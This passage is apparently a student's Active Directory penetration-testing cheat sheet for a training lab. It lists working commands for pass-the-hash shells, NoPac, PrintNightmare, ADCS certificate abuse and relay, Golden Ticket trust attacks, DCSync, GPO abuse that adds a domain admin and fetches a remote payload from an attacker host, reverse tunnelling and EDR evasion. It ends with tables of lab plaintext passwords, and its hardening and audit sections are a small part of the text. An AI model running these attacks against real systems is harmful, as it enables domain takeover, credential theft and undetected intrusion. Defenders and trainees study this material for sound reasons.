# LDAPSearch sanity check — if you can read but the DC requires signing, attempts fail:
crackmapexec ldap DC_IP -u USER -p PASS -M ldap-checker
# Outputs: LDAP signing required? LDAPS channel binding required?
```

### Privileged Access — Getting Shells

```bash
# WinRM (port 5985) — requires WinRM access (Remote Management Users group):
evil-winrm -i HOST -u USER -p PASS
evil-winrm -i HOST -u USER -H NTLM_HASH         # pass-the-hash

# PSExec (SYSTEM shell, writes to disk, noisy):
psexec.py DOMAIN/USER:PASS@HOST
psexec.py DOMAIN/USER@HOST -hashes :NTLM_HASH

# WMIExec (user-context shell, no disk writes, stealthier):
wmiexec.py DOMAIN/USER:PASS@HOST
wmiexec.py -hashes :NTLM_HASH DOMAIN/USER@HOST

# SMBExec (uses service, moderate noise):
smbexec.py DOMAIN/USER:PASS@HOST

# Read a file remotely (no shell needed):
smbclient -U USER --pw-nt-hash //HOST/C$ NTLM_HASH -c "get Users\\Administrator\\Desktop\\flag.txt /tmp/flag.txt"
```

---

## Phase 5 — Bleeding Edge Attacks

### NoPac — Machine Account to DA (requires Domain User)
**When:** ms-DS-MachineAccountQuota > 0 (default is 10) and DC is unpatched (pre-Dec 2021).
**Why:** Any domain user can add a machine account, then trick the KDC into issuing a service ticket as SYSTEM for that machine.

```bash
# Check if vulnerable:
crackmapexec smb DC_IP -u USER -p PASS -M nopac

# Exploit:
python3 noPac.py DOMAIN/USER:PASS -dc-ip DC_IP -dc-host DC_HOSTNAME --impersonate administrator -dump
# Gets administrator NTLM hash directly

# Or get a shell:
python3 noPac.py DOMAIN/USER:PASS -dc-ip DC_IP -dc-host DC_HOSTNAME --impersonate administrator -shell
```

### PrintNightmare — Remote SYSTEM via Print Spooler
**When:** Print Spooler service is running on the target (check: `Get-Service Spooler`). Unpatched Server 2016/2019.

```bash
# From Linux:
python3 CVE-2021-1675.py DOMAIN/USER:PASS@HOST '\\ATTACKER_IP\share\malicious.dll'
# malicious.dll = msfvenom payload that adds a user or drops a shell

# Check if spooler is running:
crackmapexec smb HOST -u USER -p PASS -M spooler
```

### ADCS Attacks — Certificate Services Abuse (ESC1–ESC11)
**When:** AD Certificate Services is deployed. Certipy is THE tool — enumerate templates first, then pick the ESC that matches.
**Why:** Misconfigured certificate templates let any domain user request a cert that authenticates them as any user, including DA.

#### Step 1 — Enumerate (always start here)
```bash
# Linux — Certipy:
certipy find -u USER@DOMAIN -p PASS -dc-ip DC_IP -vulnerable -stdout
# -vulnerable = filter to only show exploitable misconfigs
# -stdout = print to terminal (also saves .json, .txt, .zip)

# Windows — Certify:
.\Certify.exe find /vulnerable
.\Certify.exe find /enrolleeSuppliesSubject     # ESC1 specifically
.\Certify.exe cas                                # list Certificate Authorities
```

#### ESC1 — Template Allows SAN + Client Auth
**Indicators:** `mspki-certificate-name-flag = 1` (ENROLLEE_SUPPLIES_SUBJECT) + Client Auth EKU + Domain Users enrollment rights.

```bash
# Request cert as Administrator:
certipy req -u USER@DOMAIN -p PASS -ca CA_NAME -target CA_HOST \
  -template VulnTemplate -upn 'administrator@domain.local'
# Outputs administrator.pfx

# Authenticate with the cert → get TGT + NT hash:
certipy auth -pfx administrator.pfx -domain DOMAIN.LOCAL
# Returns: administrator's NTLM hash → PtH to DA
```

#### ESC2 — Template Allows Any Purpose / SubCA EKU
Same exploitation flow as ESC1 — request cert specifying a target user via UPN.

#### ESC3 — Enrollment Agent Template
**Indicators:** Template has Certificate Request Agent EKU + low-priv users can enroll.
```bash
# Step 1: Get the enrollment agent cert as yourself:
certipy req -u USER@DOMAIN -p PASS -ca CA_NAME -target CA_HOST -template EnrollmentAgent
# Step 2: Use it to request a cert ON BEHALF OF administrator:
certipy req -u USER@DOMAIN -p PASS -ca CA_NAME -target CA_HOST \
  -template User -on-behalf-of 'DOMAIN\administrator' -pfx agent.pfx
```

#### ESC4 — Vulnerable Template ACL (you can modify template)
**Indicators:** BloodHound shows `GenericAll`/`WriteDacl`/`WriteOwner` on a template.
```bash
# Backup current config → make it vulnerable → exploit → restore:
certipy template -u USER@DOMAIN -p PASS -template VulnTemplate -save-old
certipy template -u USER@DOMAIN -p PASS -template VulnTemplate    # makes it ESC1
# Now exploit as ESC1, then:
certipy template -u USER@DOMAIN -p PASS -template VulnTemplate -configuration old_config.json
```

#### ESC6 — CA Has EDITF_ATTRIBUTESUBJECTALTNAME2 Set
**Indicators:** CA flag `EDITF_ATTRIBUTESUBJECTALTNAME2` enabled (lets requester specify SAN on ANY template).
```bash
# Any cert request becomes ESC1 — supply -upn:
certipy req -u USER@DOMAIN -p PASS -ca CA_NAME -target CA_HOST \
  -template User -upn 'administrator@domain.local'
```

#### ESC7 — Vulnerable CA ACL (you control the CA)
**Indicators:** `ManageCA` or `ManageCertificates` rights on the CA itself.
```bash
# Add yourself as CA officer, then issue/approve your own certs:
certipy ca -u USER@DOMAIN -p PASS -ca CA_NAME -add-officer USER
# Then request a pending cert and approve it yourself
```

#### ESC8 — HTTP Endpoint Without Signing (PetitPotam → ADCS Relay)
**When:** ADCS Web Enrollment (`/certsrv`) is running over HTTP/HTTPS without channel binding. Force a privileged account (DC$) to auth → relay to ADCS → get a cert as DC$ → DCSync.

```bash
# Step 1: Start ntlmrelayx to relay to ADCS HTTP enrollment:
ntlmrelayx.py -debug -smb2support --target http://ADCS_HOST/certsrv/certfnsh.asp \
  --adcs --template DomainController

# Step 2: Coerce DC01 to authenticate to us:
python3 PetitPotam.py ATTACKER_IP DC_IP
# or: python3 Coercer.py coerce -u USER -p PASS -t DC_IP -l ATTACKER_IP
# or: python3 printerbug.py DOMAIN/USER:PASS@DC_IP ATTACKER_IP

# Step 3: ntlmrelayx outputs a base64 PFX for DC01$ — save it
# Step 4: Authenticate with the cert as DC01$ → get TGT:
certipy auth -pfx dc01.pfx -domain DOMAIN.LOCAL -dc-ip DC_IP
# Returns DC01$ NT hash

# Step 5: DCSync with DC machine account:
secretsdump.py -hashes :DC01_HASH 'DOMAIN/DC01$@DC_IP' -just-dc
# Dumps krbtgt + every domain user
```

#### Certipy Shadow Credentials (msDS-KeyCredentialLink Abuse)
**When:** You have `GenericWrite` / `GenericAll` on a target user/computer. Lets you add a key credential and authenticate as them via PKINIT.

```bash
certipy shadow auto -u USER@DOMAIN -p PASS -account TARGET_USER
# Adds a fake device cred, requests TGT as TARGET_USER, dumps their NT hash, then removes the cred
# One-shot: ACL abuse → user takeover without changing their password
```

### Pass-the-Cert (PKINIT)
```bash
# If you have a .pfx (from any ESC) → get TGT and NT hash:
certipy auth -pfx user.pfx -domain DOMAIN.LOCAL -dc-ip DC_IP

# Alternative: gettgtpkinit (PKINITtools — manual chain):
python3 gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass '' DOMAIN/USER user.ccache
export KRB5CCNAME=user.ccache
python3 getnthash.py -key AES_KEY_FROM_GETTGT DOMAIN/USER
```

---

## Phase 6 — Domain Trust Attacks

### Child → Parent Domain (ExtraSids Attack)
**When:** You have compromised a child domain (e.g., LOGISTICS.INLANEFREIGHT.LOCAL) and want to own the parent (INLANEFREIGHT.LOCAL).
**Why:** SID Filtering is OFF within a forest by default. Injecting the Enterprise Admins SID into a Golden Ticket makes the parent DC treat you as Enterprise Admin.

**Data needed:**
```bash
# 1. Child domain KRBTGT hash:
secretsdump.py LOGISTICS.INLANEFREIGHT.LOCAL/USER:PASS@CHILD_DC_IP -just-dc-user LOGISTICS/krbtgt

# 2. Child domain SID:
lookupsid.py LOGISTICS.INLANEFREIGHT.LOCAL/USER:PASS@CHILD_DC_IP | grep "Domain SID"

# 3. Parent Enterprise Admins SID (always RID 519):
lookupsid.py LOGISTICS.INLANEFREIGHT.LOCAL/USER:PASS@PARENT_DC_IP | grep -B12 "Enterprise Admins"
# Construct: PARENT_SID-519
```

**From Linux (ticketer.py):**
```bash
ticketer.py -nthash KRBTGT_HASH \
  -domain LOGISTICS.INLANEFREIGHT.LOCAL \
  -domain-sid CHILD_SID \
  -extra-sid PARENT_ENTERPRISE_ADMINS_SID \
  hacker
# Creates hacker.ccache

export KRB5CCNAME=hacker.ccache
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@PARENT_DC_FQDN -k -no-pass -target-ip PARENT_DC_IP
# SYSTEM shell on parent DC
```

**From Windows (Mimikatz):**
```powershell
# Get child domain SID:
Import-Module .\PowerView.ps1; Get-DomainSID
# Get Enterprise Admins SID:
Get-DomainGroup -Domain PARENT.LOCAL -Identity "Enterprise Admins" | select objectsid

# Forge Golden Ticket with ExtraSid:
kerberos::golden /user:hacker /domain:CHILD.LOCAL /sid:CHILD_SID /krbtgt:KRBTGT_HASH /sids:ENTERPRISE_ADMINS_SID /ptt
# /ptt = inject directly into memory (no file)
klist  # verify the ticket
ls \\PARENT_DC\c$  # confirm access
```

**Automated alternative — raiseChild.py (Impacket):**
```bash
# Does everything in one shot: DCSync krbtgt → enumerate SIDs → forge → DCSync parent
raiseChild.py -target-exec PARENT_DC_IP CHILD.DOMAIN/USER:PASS
# Outputs administrator NTLM hash from parent domain
# Use the hash for PtH to PARENT_DC
```

### Cross-Forest Kerberoasting
**When:** There's a bidirectional forest trust. Your creds work in the foreign domain too.

```bash
# Enumerate SPNs in the foreign domain:
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/forend:Klmcargo2
# -target-domain = the FOREIGN domain to query for SPNs
# INLANEFREIGHT.LOCAL/forend:Klmcargo2 = YOUR domain creds (trusted in foreign domain)

# Request and save the hashes:
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/forend:Klmcargo2 -outputfile cross_forest.txt

# Crack:
hashcat -m 13100 cross_forest.txt /usr/share/wordlists/rockyou.txt -O
```

### Cross-Forest BloodHound
**When:** You need to map attack paths across a forest trust.

```bash
# Change DNS to internal DC for primary domain:
# Edit /etc/resolv.conf:
#   domain INLANEFREIGHT.LOCAL
#   nameserver 172.16.5.5

bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2

# Change DNS to foreign DC:
#   domain FREIGHTLOGISTICS.LOCAL
#   nameserver 172.16.5.238

bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc DC03.FREIGHTLOGISTICS.LOCAL -c All \
  -u forend@inlanefreight.local -p Klmcargo2
# Note: use UPN format (user@domain) for cross-forest auth

# BloodHound query: "Users with Foreign Domain Group Membership"
```

---

## Miscellaneous Misconfigurations

### Passwords in AD Description Fields
**When:** Always check early — common misconfiguration where admins store passwords in account descriptions.

```bash
crackmapexec ldap DC_IP -u USER -p PASS -M get-desc-users
# or PowerView:
Get-DomainUser -Properties name,description | Where-Object {$_.description -ne $null}
```

### GPP Passwords (SYSVOL)
**When:** Any authenticated user can access SYSVOL. Old GPP passwords may still be there.
**Why:** Pre-2014, Group Policy Preferences stored passwords in XML files in SYSVOL encrypted with a KNOWN public key. Decryptable by anyone.

```bash
# Search SYSVOL for cpassword:
crackmapexec smb DC_IP -u USER -p PASS -M gpp_password    # auto-decrypt
crackmapexec smb DC_IP -u USER -p PASS -M gpp_autologin   # AutoLogon creds

# Manual search:
smbclient -U 'USER%PASS' //DC_IP/SYSVOL -c 'recurse; ls'
# Look for: Groups.xml, Services.xml, Scheduledtasks.xml

# Decrypt cpassword manually:
python3 -c "import base64,hashlib,pyaes; ..."
# or use: gpp-decrypt 'CPASSWORD_VALUE'
```

### PASSWD_NOTREQD Accounts
**When:** These accounts can have empty passwords or any password. They're often service accounts and forgotten admin accounts.

```bash
# Find them:
crackmapexec ldap DC_IP -u USER -p PASS --admin-count    # quick check
Get-DomainUser -UACFilter PASSWD_NOTREQD -Properties samaccountname | Select-Object samaccountname

# AS-REP Roast them (if pre-auth also disabled):
GetNPUsers.py DOMAIN/ -usersfile users_no_pwd.txt -no-pass -dc-ip DC_IP
```

### SYSVOL Script Hunting
**When:** Always grep SYSVOL — admins frequently embed credentials in logon scripts, scheduled task wrappers, and config templates that get pushed via GPO.

```bash
# Mount SYSVOL and recursive grep:
smbclient -U 'USER%PASS' //DC_IP/SYSVOL -c 'recurse; ls' > sysvol_listing.txt

# From Windows attack host:
ls \\DC_FQDN\SYSVOL\DOMAIN.LOCAL\scripts\         # logon scripts often here
ls \\DC_FQDN\SYSVOL\DOMAIN.LOCAL\Policies\         # GPO content

# Patterns to grep for:
findstr /S /I "password" \\DC_FQDN\SYSVOL\*
findstr /S /I "net use" \\DC_FQDN\SYSVOL\*         # mapped drives with creds
findstr /S /I "cpassword" \\DC_FQDN\SYSVOL\*       # GPP password leftovers
findstr /S /I "schtasks /create" \\DC_FQDN\SYSVOL\* # scheduled task creds
```

### GPO Abuse — Domain-Wide Code Execution
**When:** BloodHound shows you have write rights on a GPO linked to a targeted OU (computers or users). One GPO push → command execution on every linked machine.
**Why:** GPOs control startup/logon scripts, scheduled tasks, registry — anything the GP engine applies, you can weaponize.

```powershell
# Find GPOs you can edit:
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "Write" -and $_.SecurityIdentifier -match $YourSID}

# Or via BloodHound: "Find GPOs that can be modified by the current user"

# Abuse with SharpGPOAbuse:
.\SharpGPOAbuse.exe --AddComputerTask \
  --TaskName "Update" --Author NT AUTHORITY\SYSTEM \
  --Command "cmd.exe" --Arguments "/c net user hacker P@ssw0rd /add /domain && net group 'Domain Admins' hacker /add /domain" \
  --GPOName "Vulnerable GPO"

# Add a user-context immediate task (runs on every user logon to linked OU):
.\SharpGPOAbuse.exe --AddUserTask \
  --TaskName "Update" --Author NT AUTHORITY\SYSTEM \
  --Command "powershell.exe" --Arguments "-c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/payload.ps1')" \
  --GPOName "Vulnerable GPO"

# Force GPO refresh on targets (or wait ~90 minutes):
Invoke-GPUpdate -Computer TARGET -Force
# Or from target: gpupdate /force
```

### Printer Bug (MS-RPRN Coercion)
**When:** Print Spooler is exposed (commonly on DCs) and you control a host with HTTP/SMB listener. Forces the spooler service to authenticate to you as the machine account.

```bash
# Check if spooler is exposed:
crackmapexec smb HOST -u USER -p PASS -M spooler

# Coerce (Linux):
python3 printerbug.py DOMAIN/USER:PASS@VICTIM_DC ATTACKER_IP
# DC sends NTLM auth to ATTACKER_IP — capture with Responder or relay with ntlmrelayx

# Coerce (alt — PetitPotam works on more targets, even with PrintSvc patched):
python3 PetitPotam.py ATTACKER_IP VICTIM_IP
python3 Coercer.py coerce -u USER -p PASS -t VICTIM_IP -l ATTACKER_IP    # tries all known methods
```

---

## AD Auditing / Reporting Tools (Defensive Side — Pentest Deliverables)

### AD Explorer (Sysinternals)
**When:** You want a live GUI tree-view of AD for screenshots and quick attribute browsing.

```
Run as: .\ADExplorer.exe
Connect: DC_IP, credentials, root domain
File → Create Snapshot → save snapshot for offline analysis
File → Compare Snapshots → diff two points in time (great for detecting changes)
```

### PingCastle — Quick AD Maturity Score
**When:** Engagement deliverable — fast scan that produces an executive-friendly HTML report with a risk score (0-100).
**Why:** Maps your findings to a graded score the client can show their board.

```powershell
.\PingCastle.exe --healthcheck --server DC_FQDN
# Generates: ad_hc_DOMAIN.LOCAL.html + .xml
# Score interpretation: 100 = critical, 0 = perfect (inverted)
```

Checks include: stale accounts, weak password policies, anonymous access, vulnerable trusts, ms-DS-MachineAccountQuota, KrbTgt password age, ACL anomalies.

### Group3r — GPO-Focused Audit
**When:** You want a deep audit of every GPO in the domain — finds GPP passwords, dangerous logon scripts, weak ACLs on GPOs.

```powershell
.\Group3r.exe -f group3r.log -o group3r-pretty.txt
# Parses every GPO, checks ACLs, settings, attached scripts
# Output is huge — grep for "FINDING" lines first
```

### ADRecon — Comprehensive AD Snapshot
**When:** You want a single command that dumps an entire AD environment to an Excel workbook with 30+ tabs.

```powershell
.\ADRecon.ps1 -DomainController DC_FQDN -Credential DOMAIN\USER
# Output: ADRecon-Report-<timestamp>\ADRecon-Report.xlsx
# Tabs: Users, Computers, Groups, GPOs, OUs, Trusts, DCs, SPNs, Password Policy, etc.
```

### Tool Selection
| Tool | Use For | Output |
|------|---------|--------|
| AD Explorer | Live browsing, screenshots | GUI |
| PingCastle | Executive summary, risk score | HTML + score |
| Group3r | Deep GPO audit, password hunting | TXT log |
| ADRecon | Complete inventory for reports | Excel workbook |

---

## Hardening Quick Reference (Defensive Counter-TTPs)

| Attack | Hardening |
|--------|-----------|
| LLMNR/NBT-NS poisoning | GPO: disable LLMNR + NetBIOS over TCP/IP |
| Password spraying | Enforce 12+ char policy, account lockout, MFA, monitor 4625 |
| Kerberoasting | Service accounts: 25+ char random passwords, AES-only, gMSA |
| AS-REP Roasting | Remove `DONT_REQ_PREAUTH` from all accounts |
| GPP cpassword | Remove vulnerable GPOs (KB2962486 patch) |
| DCSync | Audit `DS-Replication-Get-Changes*` rights, monitor event 4662 |
| LSASS dump | Credential Guard, RunAsPPL, disable WDigest |
| NTLM relay | Require SMB signing + LDAP signing + Extended Protection |
| Pass-the-Hash | Tier model (T0/T1/T2), no admin reuse across tiers, LAPS |
| PrintNightmare | Disable Print Spooler on DCs |
| PetitPotam | Disable RPC/EFS, enable EPA + signing |
| NoPac | Patch CVE-2021-42278/42287, set `ms-DS-MachineAccountQuota=0` |
| GPO Abuse | Restrict GPO write rights to T0 admins only |
| ACL Abuse | Regular ACL audits, BloodHound from defender perspective |
| RBCD | Set `ms-DS-MachineAccountQuota=0`, audit `msDS-AllowedToActOnBehalfOfOtherIdentity` writes (Event 5136) |
| ADCS ESC1-ESC8 | Patch CVE-2022-26923, disable `EDITF_ATTRIBUTESUBJECTALTNAME2`, enforce manager approval, audit template ACLs |
| LDAP relay | Enforce LDAP signing + LDAPS channel binding (EPA) — Microsoft default since 2023 patches |
| DPAPI extraction | Credential Guard, no saved browser passwords, monitor backup key exports (Event 4662 on Policy Secrets) |
| Shadow Credentials | Monitor `msDS-KeyCredentialLink` writes, deny non-admins WriteProperty on this attribute |
| ExtraSids trust | Enable SID Filtering on cross-domain trusts |

---

## Pivoting to Internal Networks

### Chisel SOCKS Proxy — Route Kali Traffic Through a Compromised Host
**When:** You need to reach internal hosts from Kali but can't access them directly. The compromised host can reach internal targets.

```bash
# On Kali (server):
chisel server -p 8000 --reverse
# --reverse = accept reverse connections from clients

# On target (via command execution):
.\chisel.exe client KALI_IP:8000 R:1080:socks
# R:1080:socks = open SOCKS5 listener on Kali port 1080

# Configure proxychains on Kali:
# /etc/proxychains.conf → add: socks5 127.0.0.1 1080

# Use any tool through the tunnel:
proxychains secretsdump.py DOMAIN/USER:PASS@INTERNAL_HOST
proxychains evil-winrm -i INTERNAL_IP -u USER -p PASS
proxychains nmap -sT -p 445,5985 INTERNAL_IP
```

---

## Key Commands Summary

### Impacket Scripts Quick Reference

| Script | When to Use | Example |
|--------|-------------|---------|
| `secretsdump.py` | Dump all hashes from a DC or machine | `secretsdump.py DOMAIN/USER:PASS@DC_IP` |
| `GetUserSPNs.py` | Kerberoast — find and request TGS tickets | `GetUserSPNs.py DOMAIN/USER:PASS -request` |
| `GetNPUsers.py` | AS-REP Roast — no-preauth accounts | `GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass` |
| `psexec.py` | SYSTEM shell (noisy, writes to disk) | `psexec.py DOMAIN/USER:PASS@HOST` |
| `wmiexec.py` | User-context shell (stealthier) | `wmiexec.py DOMAIN/USER:PASS@HOST` |
| `smbexec.py` | Service-based shell, no disk write | `smbexec.py DOMAIN/USER:PASS@HOST` |
| `ticketer.py` | Forge Golden Ticket (Linux ExtraSids) | `ticketer.py -nthash KRBTGT -extra-sid EA_SID hacker` |
| `raiseChild.py` | Automated child→parent ExtraSids attack | `raiseChild.py -target-exec PARENT_IP CHILD/USER:PASS` |
| `lookupsid.py` | Get domain SID via RID brute force | `lookupsid.py DOMAIN/USER:PASS@DC_IP` |
| `mssqlclient.py` | Connect to MSSQL server | `mssqlclient.py USER:PASS@HOST` |
| `ntlmrelayx.py` | Relay NTLM auth to another host | `ntlmrelayx.py -tf targets.txt -smb2support` |
| `getTGT.py` | Request TGT (Pass-the-Password/Hash/Key) | `getTGT.py DOMAIN/USER:PASS` |
| `getST.py` | Request service ticket (S4U2Self/S4U2Proxy) | `getST.py -spn cifs/HOST DOMAIN/USER:PASS` |
| `findDelegation.py` | Find delegation misconfigurations | `findDelegation.py DOMAIN/USER:PASS -dc-ip DC_IP` |
| `GetLAPSPassword.py` | Read LAPS-managed local admin passwords | `GetLAPSPassword.py DOMAIN/USER:PASS@DC_IP` |

### Hashcat Modes — Quick Reference

| Mode | Hash Type | When You Get It |
|------|-----------|-----------------|
| `5600` | NTLMv2 | Responder / Inveigh capture |
| `1000` | NTLM | secretsdump, Mimikatz, LSASS dump |
| `13100` | Kerberos TGS (RC4) | Kerberoasting — `$krb5tgs$23$` |
| `19700` | Kerberos TGS (AES-256) | Kerberoasting — `$krb5tgs$18$` |
| `18200` | Kerberos AS-REP | AS-REP Roasting — `$krb5asrep$23$` |
| `2100` | DCC2 / MSCache v2 | secretsdump cached creds |

### Event IDs to Know (for Blue Team questions)

| Event ID | Triggered By |
|----------|-------------|
| 4625 | Failed SMB login (password spray) |
| 4771 | Failed Kerberos pre-auth (Kerbrute spray) |
| 4769 | Kerberos service ticket requested (Kerberoasting) |
| 4624 | Successful logon |
| 4648 | Explicit credential logon (runas) |
| 4672 | Special privileges assigned (DA logon) |
| 4728/4732 | User added to security group |

---

## Living Off the Land (When You Can't Drop Tools)

```powershell
# Domain info without any imports:
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers

# LDAP query without PowerView:
$Searcher = New-Object DirectoryServices.DirectorySearcher
$Searcher.Filter = "(samaccountname=TARGET)"
$Searcher.FindOne().Properties

# Find SPN accounts:
$Searcher.Filter = "(servicePrincipalName=*)"
$Searcher.FindAll() | ForEach-Object { $_.Properties.samaccountname }

# Net commands (use net1 to avoid EDR string matching):
net1 user /domain                         # all domain users
net1 group "Domain Admins" /domain        # DA members
net1 accounts /domain                     # password policy

# PS history (frequently has credentials):
Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# DNS info:
nslookup DC_HOSTNAME
Resolve-DnsName HOSTNAME -Type A
```

---

## Lab Credentials (Module Reference)

| User | Password | How Obtained |
|------|----------|-------------|
| backupagent | `h1backup55` | Responder capture |
| wley | `transporter@4` | Responder capture |
| svc_qualys | `security#1` | Inveigh capture |
| sgage | `Welcome1` | Password spray |
| SAPService | `!SapperFi2` | Kerberoasted |
| svc_vmwaresso | `Virtual01` | Kerberoasted |
| adunn | `SyncMaster757` | Targeted Kerberoast (ACL abuse chain) |
| damundsen | `Pwn3d_by_ACLs!` | ForceChangePassword reset |

### Skills Assessment I Credentials
| User | Password | How Obtained |
|------|----------|-------------|
| svc_sql | `lucky7` | Kerberoasted (SPN: MSSQLSvc/SQL01) |
| tpetty | `Sup3rS3cur3D0m@inU2eR` | LSA Secrets DefaultPassword |

### Skills Assessment II Credentials
| User | Password | How Obtained |
|------|----------|-------------|
| AB920 | `weasal` | Responder NTLMv2 capture |
| BR086 | `Welcome1` | Password spray |
| netdb | `D@ta_bAse_adm1n!` | web.config in Department Shares |
| CT059 | `charlie1` | **Inveigh** (on MS01) NTLMv2 capture |
